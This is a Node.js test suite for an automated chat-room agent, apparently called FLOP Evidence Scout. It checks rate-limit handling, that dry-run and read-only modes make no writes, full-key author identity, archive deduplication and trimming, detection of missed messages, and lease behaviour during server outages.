    const scout = new ScoutEngine({ identity, client: new TechnocoreClient({ baseUrl: 'http://127.0.0.1:1' }) });
    scout.localState.answeredAuthors = { 'did:key:z6MkBroken': 'not-a-date' };
    assert.equal(scout.pruneState().kept, 0);
  });
});

describe('an intention is not recorded as an action', () => {
  let server;
  let url;

  before(async () => {
    // Its own mock: `serverUrl` above belongs to another describe's closure, and
    // a test that reaches for it silently reads undefined.
    server = http.createServer((req, res) => {
      const path = new URL(req.url, 'http://127.0.0.1').pathname;

      if (/^\/r\/[^/]+\/say-signed\//.test(path)) {
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('[1] OK');
        return;
      }
      if (/^\/kv\//.test(path)) {
        res.writeHead(200, { 'content-type': 'text/plain' });
        res.end('OK');
        return;
      }
      if (/^\/r\/[^/]+$/.test(path)) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          messages: [{
            id: 1,
            seq: 1,
            from: 'did:key:z6MkSomeStranger',
            content: 'How does a did:key identity work for /kv/ state on Technocore?'
          }]
        }));
        return;
      }
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('OK');
    });

    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    url = `http://127.0.0.1:${server.address().port}`;
  });

  after(async () => {
    await new Promise((resolve) => server.close(resolve));
  });

  test('a reply blocked by the hourly limit does not suppress the author', async () => {
    // A guardrail with no budget: the candidate is found, the reply is refused.
    // Before the fix this still wrote answeredAuthors, locking the author out
    // for six hours over a reply that never went out — and growing the state
    // note by an entry a minute until it broke the 8192-character limit and
    // state stopped persisting entirely.
    const scout = new ScoutEngine({
      identity: generateIdentity(),
      client: new TechnocoreClient({ baseUrl: url }),
      guardrails: new Guardrails({ maxPerHour: 0, minCooldownMs: 0 }),
      // Answers draw on their own budget now, so starving the broadcast one
      // alone no longer refuses anything. Both are empty here on purpose.
      inquiryGuardrails: new Guardrails({ maxPerHour: 0, minCooldownMs: 0 }),
      watchRooms: ['lobby']
    });

    const result = await scout.runTurn({ room: 'lobby' });

    assert.match(result.action, /monitoring_pacing/, 'the reply must have been refused');
    assert.equal(Object.keys(scout.localState.answeredAuthors).length, 0,
      'a refused reply must not mark the author as answered');
    assert.equal(scout.localState.handledCount, 0,
      'a refused reply must not count as handled');
  });

  test('a reply that goes out does record the author exactly once', async () => {
    const scout = new ScoutEngine({
      identity: generateIdentity(),
      client: new TechnocoreClient({ baseUrl: url }),
      guardrails: new Guardrails({ maxPerHour: 5, minCooldownMs: 0 }),
      watchRooms: ['lobby']
    });

    const result = await scout.runTurn({ room: 'lobby' });
    assert.equal(result.action, 'answered_inquiry');
    assert.equal(Object.keys(scout.localState.answeredAuthors).length, 1);
    assert.equal(scout.localState.handledCount, 1);
  });
});

/**
 * --dry-run used to gate only the lease. Every agent still posted signed
 * messages to the live lobby, wrote notes and claimed rooms — a flag whose name
 * promises a rehearsal while delivering a real run, and `npm run dry-run` is a
 * published entry point. The gate lives in the client so a future engine
 * inherits it rather than having to remember it.
 */
describe('A read-only client', () => {
  const identity = generateIdentity();
  let attempted = 0;
  const client = () => new TechnocoreClient({
    baseUrl: 'https://example.invalid',
    readOnly: true,
    fetchFn: async () => { attempted++; throw new Error('a read-only client must never reach the network to write'); }
  });

  test('refuses to post, sign, write a note or claim a room', async () => {
    attempted = 0;
    await assert.rejects(() => client().postMessage('lobby', 'hello', identity), /refusing to post to \/r\/lobby/);
    await assert.rejects(() => client().postSignedMessage('lobby', 'hello', identity), /refusing to post a signed message/);
    await assert.rejects(() => client().setKv('scout', 'state', '{}'), /refusing to write the note \/kv\/scout\/state/);
    await assert.rejects(() => client().claimRoomOwnership('d-test', identity), /refusing to claim ownership/);
    assert.equal(attempted, 0, 'no write ever became a request');
  });

  test('still reads, because observing costs nobody anything', async () => {
    const reading = new TechnocoreClient({
      baseUrl: 'https://example.invalid',
      readOnly: true,
      fetchFn: async () => ({
        ok: true,
        status: 200,
        headers: { get: () => 'text/plain' },
        text: async () => '[1] 2026-08-28T00:00:00Z <~someone> hello'
      })
    });
    const result = await reading.readRoom('lobby');
    assert.equal(result.messages.length, 1);
  });
});

/**
 * The text view renders a verified writer as `<z6Mk…KiGa>`, and every Ed25519
 * did:key begins `z6Mk` — so the whole discriminating content is four base58
 * characters, 23.4 bits. Reading that as the author broke three things at once.
 */
describe('Room reads carry a real identity', () => {
  test('the two lanes agree on field names', async () => {
    const jsonClient = new TechnocoreClient({
      baseUrl: 'https://example.invalid',
      fetchFn: async () => ({
        ok: true,
        status: 200,
        headers: { get: () => 'application/json' },
        json: async () => ([{ seq: 7, ts: '2026-08-28T00:00:00Z', from: 'did:key:z6MkFULL', text: 'hello' }])
      })
    });
    const textClient = new TechnocoreClient({
      baseUrl: 'https://example.invalid',
      fetchFn: async () => ({
        ok: true,
        status: 200,
        headers: { get: () => 'text/plain' },
        text: async () => '[7] 2026-08-28T00:00:00Z <z6Mk…FULL> hello'
      })
    });

    const [j] = (await jsonClient.readRoom('lobby', { format: 'json' })).messages;
    const [t] = (await textClient.readRoom('lobby')).messages;

    // A reader must not have to know which lane it got.
    for (const field of ['seq', 'timestamp', 'content']) {
      assert.ok(j[field] !== undefined, `json message is missing ${field}`);
      assert.ok(t[field] !== undefined, `text message is missing ${field}`);
    }
    assert.equal(j.content, 'hello');
    assert.equal(t.content, 'hello');

    // The one field that genuinely differs, and the reason for reading JSON.
    assert.equal(j.from, 'did:key:z6MkFULL', 'json carries the whole key');
    assert.equal(t.from, 'z6Mk…FULL', 'text carries 23 bits of it');
  });

  test('the scout excludes its own messages, which the text view made impossible', async () => {
    const identity = generateIdentity();
    const abbreviated = `z6Mk…${identity.did.slice(-4)}`;

    // The old comparison, spelled out: this is what ran for every read.
    assert.notEqual(abbreviated, identity.did,
      'an abbreviated marker never equals a did:key, so the self-filter never fired');

    const client = new TechnocoreClient({
      baseUrl: 'https://example.invalid',
      fetchFn: async () => ({
        ok: true,
        status: 200,
        headers: { get: () => 'application/json' },
        json: async () => ([
          { seq: 1, ts: '2026-08-28T00:00:00Z', from: identity.did, text: 'a message we posted ourselves' },
          { seq: 2, ts: '2026-08-28T00:00:01Z', from: 'did:key:z6MkSomeoneElse', text: 'a message from a stranger' }
        ])
      })
    });

    const scout = new ScoutEngine({
      identity,
      scribeIdentity: generateIdentity(),
      client,
      guardrails: new Guardrails({ maxPerHour: 2, minCooldownMs: 0 })
    });

    const { fresh, maxSeq } = await scout.collectNewMessages('lobby');
    assert.equal(fresh.length, 1, 'our own message was excluded');
    assert.equal(fresh[0].from, 'did:key:z6MkSomeoneElse');
    assert.equal(maxSeq, 2, 'the cursor still advances past our own message');
  });

  test('two distinct agents are not one author just because they render alike', async () => {
    // Upstream measured 1,452 colliding pairs across 180,794 real keys, and the
    // population is now 533,468. A cooldown keyed on the marker suppresses a
    // stranger because someone unrelated was answered six hours ago.
    const a = 'did:key:z6MkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKiGa';
    const b = 'did:key:z6MkBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBKiGa';
    assert.notEqual(a, b);
    assert.equal(`z6Mk…${a.slice(-4)}`, `z6Mk…${b.slice(-4)}`,
      'the text view cannot tell these two apart — which is why we read JSON');
  });
});

/**
 * The archive carried the same O(n-squared) shape the inference ledger did:
 * every append re-read and re-parsed the whole file. Measured at 31 ms per
 * append on a 2.8 MB archive, across six rooms, every cycle, growing.
 */
describe('The chat archive', () => {
  const tempArchive = () => fs.mkdtempSync(path.join(os.tmpdir(), 'flop-archive-'));
  const msgs = (base, n = 5) => Array.from({ length: n }, (_, i) => ({
    seq: base + i, from: 'did:key:zTest', content: `message ${base + i}`, ts: '2026-08-28T00:00:00Z'
  }));

  test('a message already archived is not archived twice', () => {
    const dir = tempArchive();
    resetArchiveIndex();
    archiveRoomMessages('lobby', msgs(100), dir);
    archiveRoomMessages('lobby', msgs(100), dir);

    const lines = fs.readFileSync(path.join(dir, 'lobby-archive.jsonl'), 'utf8').split('\n').filter(Boolean);
    assert.equal(lines.length, 5, 'the second pass added nothing');
  });

  test('messages written by another process are still seen as duplicates', () => {
    const dir = tempArchive();
    const file = path.join(dir, 'lobby-archive.jsonl');
    resetArchiveIndex();
    archiveRoomMessages('lobby', msgs(200), dir);

    // A second daemon appends behind our back.
    fs.appendFileSync(file, JSON.stringify({ seq: 999, content: 'from elsewhere' }) + '\n', 'utf8');
    archiveRoomMessages('lobby', [{ seq: 999, content: 'from elsewhere' }], dir);

    const lines = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean);
    assert.equal(lines.length, 6, 'the index refreshed from the file rather than trusting itself');
  });

  test('the archive is bounded, and keeps the newest', () => {
    const dir = tempArchive();
    const file = path.join(dir, 'lobby-archive.jsonl');
    resetArchiveIndex();
    // Well past a small cap, in one go.
    archiveRoomMessages('lobby', msgs(1000, 400), dir);
    const before = fs.statSync(file).size;

    const result = trimArchive(file, { maxBytes: 1000 });
    assert.equal(result.trimmed, true);
    assert.ok(fs.statSync(file).size < before);

    const kept = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l).seq);
    assert.equal(kept.at(-1), 1399, 'the newest line survived');
    assert.ok(kept[0] > 1000, 'the oldest lines were the ones dropped');
  });

  test('a trimmed archive can still accept the messages it just dropped', () => {
    const dir = tempArchive();
    const file = path.join(dir, 'lobby-archive.jsonl');
    resetArchiveIndex();
    archiveRoomMessages('lobby', msgs(500, 40), dir);
    trimArchive(file, { maxBytes: 200 });

    // A stale index would refuse these as duplicates and lose them silently.
    archiveRoomMessages('lobby', msgs(500, 5), dir);
    const seqs = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l).seq);
    assert.ok(seqs.includes(500), 'a dropped message can be re-archived after a trim');
  });
});

/**
 * A room is a ring. /r/lobby runs at ~2,900 messages a minute and keeps only the
 * last ~10 MiB, so a cursor left behind by a restart or a lease standdown does
 * not fall behind — it falls off, and every read afterwards looks perfectly
 * healthy. The manual is explicit about the tell: "If a reply reports first_seq
 * greater than your since+1, you missed lines."
 */
describe('Missed messages are noticed', () => {
  const roomClient = (body) => new TechnocoreClient({
    baseUrl: 'https://example.invalid',
    fetchFn: async () => ({
      ok: true, status: 200,
      headers: { get: () => 'application/json' },
      json: async () => body
    })
  });

  const scoutWith = (client, cursor) => {
    const scout = new ScoutEngine({
      identity: generateIdentity(), scribeIdentity: generateIdentity(),
      client, guardrails: new Guardrails({ maxPerHour: 2, minCooldownMs: 0 })
    });
    scout.localState.roomCursors = { lobby: cursor };
    return scout;
  };

  test('a ring that dropped unread history is reported, with the count', async () => {
    // We last read seq 100; the room now starts at 151. Fifty are gone.
    const client = roomClient({
      first_seq: 151, last_seq: 152,
      messages: [{ seq: 151, ts: 'x', from: 'did:key:z6MkA', text: 'hello' },
        { seq: 152, ts: 'x', from: 'did:key:z6MkB', text: 'hi' }]
    });
    const { gap, maxSeq } = await scoutWith(client, 100).collectNewMessages('lobby');

    assert.ok(gap, 'the gap must not be silent');
    assert.equal(gap.missed, 50);
    assert.equal(gap.from, 101);
    assert.equal(gap.to, 150);
    assert.equal(maxSeq, 152, 'the cursor still advances past the gap');
  });

  test('an unbroken read reports no gap', async () => {
    const client = roomClient({
      first_seq: 101, last_seq: 102,
      messages: [{ seq: 101, ts: 'x', from: 'did:key:z6MkA', text: 'hello' },
        { seq: 102, ts: 'x', from: 'did:key:z6MkB', text: 'hi' }]
    });
    const { gap } = await scoutWith(client, 100).collectNewMessages('lobby');
    assert.equal(gap, null, 'first_seq exactly one past the cursor is continuous');
  });

  test('a first read has no cursor to have fallen behind', async () => {
    const client = roomClient({
      first_seq: 900000, last_seq: 900001,
      messages: [{ seq: 900000, ts: 'x', from: 'did:key:z6MkA', text: 'hello' },
        { seq: 900001, ts: 'x', from: 'did:key:z6MkB', text: 'hi' }]
    });
    // Cursor 0 means we have never read this room; joining mid-stream is normal.
    const { gap } = await scoutWith(client, 0).collectNewMessages('lobby');
    assert.equal(gap, null, 'starting fresh is not a loss');
  });

  test('a server that omits first_seq cannot fabricate a gap', async () => {
    const client = roomClient({
      messages: [{ seq: 200, ts: 'x', from: 'did:key:z6MkA', text: 'hello' }]
    });
    const { gap } = await scoutWith(client, 100).collectNewMessages('lobby');
    assert.equal(gap, null, 'no evidence of loss is not evidence of loss');
  });
});

/**
 * The cloud half of the failover, which had never once run.
 *
 * The scheduled workflow invoked the daemon with --dry-run, and dryRun implies
 * readOnly, so every cloud run did zero writes: no lease, no post, no recorded
 * cycle. Both the launcher window and PROJEKTAS.md told the operator that
 * GitHub takes over when the PC is off. It never had, and a 21-hour outage went
 * uncovered because there was nothing there to cover it.
 *
 * These two flags must stay opposites, so this is asserted rather than trusted.
 */
describe('--once and --dry-run are not the same thing', () => {
  test('--dry-run is a rehearsal: one cycle, no writes', () => {
    const o = parseArgs(['node', 'daemon', '--dry-run']);
    assert.equal(o.dryRun, true);
    assert.notEqual(o.once, true, 'a rehearsal is not a real cycle');
  });

  test('--once is a real cycle that happens to be the only one', () => {
    const o = parseArgs(['node', 'daemon', '--once']);
    assert.equal(o.once, true);
    assert.notEqual(o.dryRun, true, '--once must never imply readOnly');
  });

  test('the default is neither: run until stopped', () => {
    const o = parseArgs(['node', 'daemon']);
    assert.notEqual(o.once, true);
    assert.notEqual(o.dryRun, true);
  });
});

/**
 * The read window, and the one rule the server changed under us.
 *
 * 0.11.0 clamps `limit` to 1..200 and refuses if_absent together with if=.
 * Both are pinned here because both are the kind of thing that breaks quietly:
 * a window silently clamped back to 50 would look like a working agent that
 * simply never saw anything, and before 0.11.0 sending both conditions got you
 * a write you never asked for and an "ok" in reply.
 */
describe('reading, at the size the server actually allows', () => {
  test('the read window is within the documented clamp', () => {
    assert.ok(READ_WINDOW >= 1 && READ_WINDOW <= 200,
      `limit is clamped to 1..200 by the server; ${READ_WINDOW} would be silently replaced`);
  });

  test('if_absent and if= are refused together, not silently resolved', async () => {
    const client = new TechnocoreClient({ baseUrl: 'https://example.invalid' });
    await assert.rejects(
      () => client.setKv('ns', 'key', 'value', { ifAbsent: true, ifValue: 'other' }),
      /mutually exclusive/
    );
  });

  test('either condition alone is still allowed to reach the server', () => {
    // Not executed against a server — the point is that the guard above does not
    // reject the ordinary single-condition calls the lease depends on.
    const client = new TechnocoreClient({ baseUrl: 'https://example.invalid' });
    assert.doesNotThrow(() => { client.setKv('ns', 'k', 'v', { ifAbsent: true }).catch(() => {}); });
    assert.doesNotThrow(() => { client.setKv('ns', 'k', 'v', { ifValue: 'x' }).catch(() => {}); });
  });
});

/**
 * The transport is the only thing that knows whether the server answered.
 *
 * Every caller was guessing from its own error string, which is why a total
 * outage produced twenty different "broken" lines a minute and no single line
 * saying the one true thing: Technocore is down, the agent is fine.
 */
describe('knowing whether the server is actually there', () => {
  const res = (status) => ({ ok: status < 400, status, text: async () => '', json: async () => ({}) });

  test('a 5xx counts as not reaching the server', async () => {
    const client = new TechnocoreClient({ baseUrl: 'https://x.invalid', fetchFn: async () => res(503) });
    await client.fetch('https://x.invalid/r/lobby').catch(() => {});
    await client.fetch('https://x.invalid/r/lobby').catch(() => {});
    assert.equal(client.consecutiveFailures, 2);
    assert.equal(client.lastOkAt, null, 'never once got through');
  });

  test('a 404 is an answer, not an outage', async () => {
    const client = new TechnocoreClient({ baseUrl: 'https://x.invalid', fetchFn: async () => res(404) });
    await client.fetch('https://x.invalid/kv/nope').catch(() => {});
    assert.equal(client.consecutiveFailures, 0, 'the server told us something');
    assert.ok(client.lastOkAt, 'and that counts as reachable');
  });

  test('one good answer clears the streak', async () => {
    let status = 503;
    const client = new TechnocoreClient({ baseUrl: 'https://x.invalid', fetchFn: async () => res(status) });
    await client.fetch('https://x.invalid/r/lobby').catch(() => {});
    await client.fetch('https://x.invalid/r/lobby').catch(() => {});
    assert.equal(client.consecutiveFailures, 2);

    status = 200;
    await client.fetch('https://x.invalid/r/lobby');
    assert.equal(client.consecutiveFailures, 0);
  });

  test('a transport failure counts too', async () => {
    const client = new TechnocoreClient({
      baseUrl: 'https://x.invalid',
      fetchFn: async () => { throw new Error('This operation was aborted'); }
    });
    await assert.rejects(() => client.fetch('https://x.invalid/r/lobby'));
    assert.equal(client.consecutiveFailures, 1);
  });
});

/**
 * The check-in has to survive being cut off.
 *
 * A third-party lookup displays roughly the first 120 characters of an agent's
 * latest signed message. Ours read "...turn 2340, 355 questions answered |
 * watching technocore#2563782 inference-agents#145478 flop-netwo" and stopped:
 * a turn counter and six sequence numbers, indistinguishable from the template
 * bots this project exists to be measurably unlike. The guide link, the
 * telemetry room and the source repository were all in the 473 characters
 * nobody saw.
 */
describe('the public check-in, as a stranger sees it', () => {
  const VISIBLE = 120;
  const GUIDE = 'https://mariukasfak.github.io/flop-evidence-scout/guide.html';

  const checkin = (turns, handled, rooms, primary, cursor) =>
    `[FLOP Evidence Scout] Protocol field guide: ${GUIDE} `
    + '— measured limits, throughput, five silent failure modes '
    + `| turn ${turns}, ${handled} questions answered, ${rooms} rooms read (${primary}#${cursor}) `
    + '| measured readings, protocol changes and scam advisories: /r/d-scout-telemetry '
    + '| source: github.com/Mariukasfak/flop-evidence-scout | ask me anything about the wire protocol.';

  test('the whole guide link fits inside what is shown', () => {
    // Worst case: the biggest counters we could plausibly print.
    const msg = checkin(999999, 99999, 6, 'inference-agents', 999999999);
    const end = msg.indexOf(GUIDE) + GUIDE.length;
    assert.ok(end <= VISIBLE, `the link ends at ${end}, past the ${VISIBLE} a reader sees`);
  });

  test('what is shown says who we are and offers something', () => {
    const shown = checkin(2340, 355, 6, 'technocore', 2563782).slice(0, VISIBLE);
    assert.match(shown, /FLOP Evidence Scout/);
    assert.match(shown, /field guide/i);
    assert.ok(!/#\d+ \w+#\d+/.test(shown), 'no wall of cursor numbers in the visible part');
  });

  test('it still fits the message limit with room to spare', () => {
    assert.ok(checkin(999999, 99999, 6, 'inference-agents', 999999999).length < 4096);
  });
});


describe('an outage must not idle the model', () => {
  // Two of eight consecutive cycles read nothing at all when Technocore
  // flapped, and a cycle that reads nothing plans nothing — so a local GPU and
  // 99,095 archived messages sat idle because somebody else's server was down.
  test('reads messages back out of the archive when the network gave none', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'archive-tail-'));
    archiveRoomMessages('lobby', [
      { seq: 1, timestamp: 't', from: 'a', content: 'first message in the room' },
      { seq: 2, timestamp: 't', from: 'b', content: 'second message in the room' }
    ], dir);

    const back = readArchiveTail(dir, ['lobby']);
    assert.equal(back.length, 2);
    assert.deepEqual(back.map((m) => m.text),
      ['first message in the room', 'second message in the room']);
    assert.ok(back.every((m) => m.room === 'lobby'));
  });

  test('a room never archived contributes nothing rather than throwing', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'archive-tail-'));
    assert.deepEqual(readArchiveTail(dir, ['never-seen']), []);
  });

  test('the tail is bounded, so a full archive cannot swallow a cycle', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'archive-tail-'));
    archiveRoomMessages('lobby', Array.from({ length: 900 }, (_, i) => (
      { seq: i + 1, timestamp: 't', from: 'a', content: `message number ${i} with enough text to matter` }
    )), dir);

    const back = readArchiveTail(dir, ['lobby'], 200);
    assert.equal(back.length, 200, 'took the newest slice, not the whole file');
    assert.match(back.at(-1).text, /message number 899/);
  });
});

describe('knowing whether we are running the code on disk', () => {
  // A daemon holds the modules it started with, so a fix can be committed and
  // inert at the same time — which happened repeatedly across one day while the
  // status screen reported everything as fine. The version that first did this
  // read HEAD three times in one expression and nothing checked it; a reader
  // that silently always answers "no change" is indistinguishable from one that
  // works.
  test('resolves a normal checkout to its commit', () => {
    const head = readGitHead(process.cwd());
    assert.match(head, /^[0-9a-f]{40}$/, 'this repo should resolve to a sha');
  });

  test('a detached HEAD is the sha itself', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'head-'));
    fs.mkdirSync(path.join(dir, '.git'), { recursive: true });
    const sha = 'a'.repeat(40);
    fs.writeFileSync(path.join(dir, '.git', 'HEAD'), sha);
    assert.equal(readGitHead(dir), sha);
  });

  test('follows a ref to the file that holds the sha', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'head-'));
    fs.mkdirSync(path.join(dir, '.git', 'refs', 'heads'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/main');
    fs.writeFileSync(path.join(dir, '.git', 'refs', 'heads', 'main'), 'b'.repeat(40));
    assert.equal(readGitHead(dir), 'b'.repeat(40));
  });

  test('anything unreadable answers null, which never means restart', () => {
    // A packed ref, a repo mid-write, or no checkout at all are all reasons to
    // carry on rather than to stand down.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'head-'));
    assert.equal(readGitHead(dir), null);

    fs.mkdirSync(path.join(dir, '.git'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/gone');
    assert.equal(readGitHead(dir), null, 'a ref with no loose file is unknown, not changed');
  });
});

/**
 * The second outage to strand this agent. The first cost twelve minutes and was
 * fixed by resuming a held lease across a restart; this one cost half an hour
 * with no restart involved, because an unreachable lease and a lease somebody
 * else holds were the same branch.
 */
describe('An outage suppresses writes, it does not stop the cycle', () => {
  test('a lease we hold proceeds', () => {
    assert.equal(leaseOutcome({ acquired: true }), 'proceed');
    assert.equal(leaseOutcome({ acquired: true, degraded: true }), 'proceed');
  });

  test('a lease somebody else holds stands us down', () => {
    // Another writer is working. A second one would collide, which is the
    // entire reason the lease exists.
    assert.equal(leaseOutcome({ acquired: false, heldBy: 'other-machine' }), 'stand_down');
  });

  test('a lease we cannot reach runs the cycle read-only', () => {
    // The lease lives on the server that is down, so the writer we would have
    // collided with cannot write either. Standing down protects nothing and
    // blinds the surface watcher through exactly the window a redeploy lands in.
    assert.equal(leaseOutcome({ acquired: false, transient: true, reason: 'HTTP 530' }), 'proceed_readonly');
  });

  test('a missing attempt is treated as somebody else holding it', () => {
    // The cautious direction: never invent permission to write out of nothing.
    assert.equal(leaseOutcome(undefined), 'stand_down');
    assert.equal(leaseOutcome({}), 'stand_down');
  });
});
